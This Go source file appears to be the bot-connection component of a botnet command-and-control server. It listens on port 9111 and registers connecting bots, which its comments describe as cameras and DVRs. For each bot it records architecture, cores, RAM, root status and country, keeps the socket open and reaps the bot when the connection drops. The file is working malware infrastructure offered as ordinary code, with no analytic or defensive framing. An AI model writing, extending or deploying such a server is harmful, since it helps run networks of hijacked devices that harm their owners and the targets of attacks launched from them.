// language: Go, file: cnc/internal/botconn/botconn.go
// *9111: accept -> read reg line -> register -> park socket -> reap on drop*
package botconn

import (
	"bufio"
	"log"
	"net"
	"strconv"
	"strings"
	"sync"
	"time"

	"bigheights/cnc/internal/protocol"
	"bigheights/cnc/internal/registry"
)

// Server owns the 9111 listener.
type Server struct {
	Addr string
	Reg  *registry.Registry
	Geo  *registry.GeoDB

	mu     sync.Mutex
	ln     net.Listener
	closed bool
}

// regTimeout is how long a freshly-connected socket has to speak its reg line.
// Cameras and DVRs are slow; a few seconds is generous without letting a
// silent scanner hold a file descriptor indefinitely.
const regTimeout = 10 * time.Second

// maxRegLine bounds the registration line to prevent unbounded reads.
const maxRegLine = 512

// Listen starts accepting bots. Blocks until Close.
func (s *Server) Listen() error {
	ln, err := net.Listen("tcp", s.Addr)
	if err != nil {
		return err
	}
	s.mu.Lock()
	s.ln = ln
	s.mu.Unlock()

	for {
		conn, err := ln.Accept()
		if err != nil {
			s.mu.Lock()
			closed := s.closed
			s.mu.Unlock()
			if closed {
				return nil
			}
			// transient accept error — brief pause, retry
			time.Sleep(50 * time.Millisecond)
			continue
		}
		go s.handle(conn)
	}
}

// Close stops the listener; parked bot sockets close naturally.
func (s *Server) Close() {
	s.mu.Lock()
	defer s.mu.Unlock()
	s.closed = true
	if s.ln != nil {
		_ = s.ln.Close()
	}
}

// handle is one bot's lifetime on the CNC: reg line, then park.
func (s *Server) handle(conn net.Conn) {
	defer conn.Close()

	_ = conn.SetReadDeadline(time.Now().Add(regTimeout))
	br := bufio.NewReaderSize(conn, maxRegLine+1)
	line, err := br.ReadString('\n')
	if err != nil {
		return // silent scanner, no reg line
	}
	line = strings.TrimRight(line, "\r\n")
	if len(line) == 0 || len(line) > maxRegLine {
		return
	}

	info, err := protocol.ParseReg(line)
	if err != nil {
		return // malformed registration
	}

	ip := remoteIP(conn)
	if ip == "" {
		return
	}

	// country from the local geoip table, if not already supplied
	if info.Country == "" && s.Geo != nil {
		info.Country = s.Geo.Lookup(ip)
	}

	bot := s.Reg.Register(conn, info, ip)
	log.Printf("bot #%d registered %s arch=%s cores=%d ram=%dMB rooted=%v cc=%s",
		bot.ID, bot.Addr, bot.Arch, bot.Cores, bot.RAM, bot.Rooted, bot.Country)

	// No tasking is read back from the bot per spec. The read loop exists
	// only to notice the socket drop. Clear the reg deadline.
	_ = conn.SetReadDeadline(time.Time{})

	buf := make([]byte, 64)
	for {
		n, err := conn.Read(buf)
		if err != nil {
			break
		}
		if n > 0 {
			bot.Touch()
		}
	}

	bot.MarkDead()
	s.Reg.Remove(bot.ID)
	log.Printf("bot #%d disconnected %s", bot.ID, bot.Addr)
}

// remoteIP extracts the IPv4 literal from a RemoteAddr.
func remoteIP(conn net.Conn) string {
	host, _, err := net.SplitHostPort(conn.RemoteAddr().String())
	if err != nil {
		return ""
	}
	// strip any IPv6-mapped prefix
	if i := strings.LastIndex(host, ":"); i >= 0 && strings.Count(host, ":") > 1 {
		host = strings.TrimPrefix(host, "::ffff:")
	}
	return host
}

// ParsePort is a small helper for config lines that carry ":9111".
func ParsePort(addr string) int {
	_, p, err := net.SplitHostPort(addr)
	if err != nil {
		return 0
	}
	n, _ := strconv.Atoi(p)
	return n
}